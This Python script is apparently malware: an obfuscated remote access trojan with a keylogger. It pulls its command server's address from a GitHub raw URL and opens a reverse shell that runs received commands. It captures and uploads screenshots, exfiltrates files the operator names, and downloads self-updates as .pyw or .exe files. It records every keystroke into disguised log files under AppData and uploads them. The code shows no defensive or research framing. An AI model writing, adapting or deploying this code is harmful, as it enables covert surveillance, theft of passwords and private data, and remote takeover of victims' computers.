import subprocess,socket,time,requests,os,logging,threading
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
IMkWLOnec = ""
EGVfXCcyk = ""
gEUOoirDVSyiCXPO = "07.12.24.0"
FRGFlpFqiH = "!"
hFgVRNTQIahOaF = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
rqylwOKHjK = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
LOGGING_PATH = os.path.expanduser("~\\AppData\\Local\\")
def clfHLACzmUthPbQy(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def tAxLLRidZmW(s):
	JQGbIZqaonupgpZI = s.recv(1024)
	if len(JQGbIZqaonupgpZI)==0:
		return True
	iblGoWhMYcXkj = JQGbIZqaonupgpZI.decode("utf-8").replace("\n","")
	if not iblGoWhMYcXkj.startswith(FRGFlpFqiH):
		proc = subprocess.run(iblGoWhMYcXkj, shell=True, capture_output=True)
		NGUAlafxWOwEpAEXkfE = proc.stdout + proc.stderr
		s.send(NGUAlafxWOwEpAEXkfE)
		return
	UqXUGvKhTNrmIgjwNxej = iblGoWhMYcXkj.split(" ")[0][1:]
	if UqXUGvKhTNrmIgjwNxej == "download":
		WutEbRIgnPbOQggHC(s, iblGoWhMYcXkj)
	elif UqXUGvKhTNrmIgjwNxej == "screenshot":
		lbKTFKJBCZmdUNyxR(s)
	elif UqXUGvKhTNrmIgjwNxej == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif UqXUGvKhTNrmIgjwNxej == "update":
		manualUpdate(s)
def WutEbRIgnPbOQggHC(s, iblGoWhMYcXkj):
	uoZdXbAlMaUUiLZ = iblGoWhMYcXkj.replace(FRGFlpFqiH+"download ","").split(",")
	NGUAlafxWOwEpAEXkfEs = ""
	for f in uoZdXbAlMaUUiLZ:
		NGUAlafxWOwEpAEXkfEs += VVyrBobATlPu(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(NGUAlafxWOwEpAEXkfEs, "utf-8"))
def lbKTFKJBCZmdUNyxR(s):
	tuPIhxFexOVN = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	uwJtvqjAPvqepyHN = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	tuPIhxFexOVN.save(uwJtvqjAPvqepyHN)
	tuPIhxFexOVN.close()
	r = VVyrBobATlPu(uwJtvqjAPvqepyHN, "api/sscap")
	os.remove(uwJtvqjAPvqepyHN)
	s.send(bytes(r,"utf-8"))
def VVyrBobATlPu(tVGCJMsGIAfh, dMofwGd, xptaOPiQhaGnNswnLmcp=None):
	if not os.path.isfile(tVGCJMsGIAfh):
		return "[!] 404: "+tVGCJMsGIAfh+"\n"
	headers = {"user":os.getlogin()}
	if xptaOPiQhaGnNswnLmcp is not None:
		headers = {**headers, **xptaOPiQhaGnNswnLmcp}
	requests.post("http://"+IMkWLOnec+":5555/"+dMofwGd,
		files={"file":open(tVGCJMsGIAfh, "rb")},
		headers=headers)
	return "[+] 200: "+tVGCJMsGIAfh+"\n"
def manualUpdate(s):
	h, p, v = getStartupInfo(True)
	if (v != gEUOoirDVSyiCXPO):
		update(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def update(RetfbgVviLECfYRbHydBPR):
	tEuILhTFR = os.path.basename(__file__)
	fileType = tEuILhTFR.split(".")[-1]
	wuFaGpCsWkYkTLWqkZe = tEuILhTFR.split(".")[0]+"."+RetfbgVviLECfYRbHydBPR+".pyw" if fileType.startswith("py") else ".exe"
	KPuIfiBIanOfniRKf = os.path.join(os.getcwd(), wuFaGpCsWkYkTLWqkZe)
	if not os.path.isfile(KPuIfiBIanOfniRKf):
		with open(wuFaGpCsWkYkTLWqkZe, "w+") as f:
			f.write(requests.get(rqylwOKHjK+"file."+ "pyw" if KPuIfiBIanOfniRKf.split(".")[-1].startswith("py") else "exe").text)
def getStartupInfo(force=False):
	global IMkWLOnec, EGVfXCcyk
	if force or IMkWLOnec == "" or EGVfXCcyk == "":
		JQGbIZqaonupgpZI = requests.get(hFgVRNTQIahOaF).text.replace("\n","").split(":")
		IMkWLOnec = JQGbIZqaonupgpZI[0].strip()
		EGVfXCcyk = JQGbIZqaonupgpZI[1].strip()
		RetfbgVviLECfYRbHydBPR = JQGbIZqaonupgpZI[2].strip()
	return IMkWLOnec, EGVfXCcyk, RetfbgVviLECfYRbHydBPR
def uVZEgDaRMnyeTeAtuXjn():
	pass
def checkKeyLogs():
	try:
		logFileName = "settings.xpb"
		logFiles = sorted([file for file in os.listdir(LOGGING_PATH) if os.path.isfile(LOGGING_PATH+"\\"+file) and file.endswith(logFileName.split(".")[-1])])
		if logFileName in logFiles:
			logFiles.remove(logFileName)
		logFileFullPath = os.path.join(LOGGING_PATH,logFileName)
		if len(logFiles) > 0:
			with open(logFileFullPath, "ab+") as f:
				for file in logFiles:
					temp = LOGGING_PATH+"\\"+file
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		VVyrBobATlPu(logFileFullPath, "api/log")
		if os.path.isfile(logFileFullPath):
			os.remove(logFileFullPath)
	except:
		pass
def CpwpQkiLiuot():
	h, p, v = KgnxRXfBNqvcouk()
	checkKeyLogs()
	uVZEgDaRMnyeTeAtuXjn()
	if gEUOoirDVSyiCXPO != v:
		update(v)
	DshVOmCRkjLKHafGEO = bytes("["+gEUOoirDVSyiCXPO+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				CkzVfhbISjryxthfSFyT=False
				try:
					s=clfHLACzmUthPbQy(h, p)
					while not CkzVfhbISjryxthfSFyT:
						s.send(DshVOmCRkjLKHafGEO)
						CkzVfhbISjryxthfSFyT=tAxLLRidZmW(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
t1=threading.Thread(CpwpQkiLiuot())
t1.start()
logging.basicConfig(filename=(LOGGING_PATH+str(datetime.today().strftime("%d")) + ".xpb"), level=logging.DEBUG, format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
def logKey(k):
	logging.info(str(k))
with Listener(on_press=logKey,suppress=True) as f:
	f.join()
